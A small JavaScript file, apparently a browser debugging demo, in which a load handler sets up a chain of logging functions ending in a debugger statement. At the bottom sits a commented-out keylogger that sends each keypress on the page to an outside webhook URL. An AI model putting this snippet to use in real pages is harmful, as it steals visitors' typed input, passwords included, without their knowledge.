window.addEventListener("load", function foo() {
  window.cs = function bar() {
    console.log('bar');
    spam();
  }
});

function spam() {
  console.log('spam');
  ham();
}

function ham() {
  console.log('ham');
  eggs();
}

function eggs() {
  var amtiDamti = 1;
  debugger;
  console.log('eggs');
}

// async function getData(key) {
//   const url = "xxxhttps://webhook.site/44b4eabe-7f33-4794-ab64-b2f470778627?key="; // Your desired URL here

//   try {
//       const response = await fetch(url + key);

//       if (!response.ok) {
//           throw new Error(`Response status: ${response.status}`);
//       }

//       const json = await response.json();
//       console.log(json); // Do something with the JSON data
//   } catch (error) {
//       console.error(error.message);
//   }
// }

// document.body.addEventListener('keypress', async function (e) {
//   await getData(e.key);
// });